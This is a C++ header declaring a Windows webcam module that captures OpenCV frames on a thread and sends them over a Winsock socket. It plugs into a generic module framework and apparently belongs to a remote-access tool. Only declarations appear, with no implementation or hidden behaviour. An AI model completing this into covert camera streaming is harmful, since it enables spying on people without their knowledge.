#pragma once
#include "module.h"
#include <atomic>
#include <thread>
#include <winsock2.h>
#include <opencv2/opencv.hpp>

class Webcam_Module : public Module {
private:
    std::atomic<bool> recording;
    std::thread webcamThread;
    cv::VideoCapture cap;
    SOCKET clientSocket;
    
    void captureAndSendFrames();
    
public:
    Webcam_Module();
    ~Webcam_Module();
    
    const char* name() const override;
    void run() override;
    
    bool startWebcam(SOCKET sock);
    void stopWebcam();
    bool isRecording() const;
};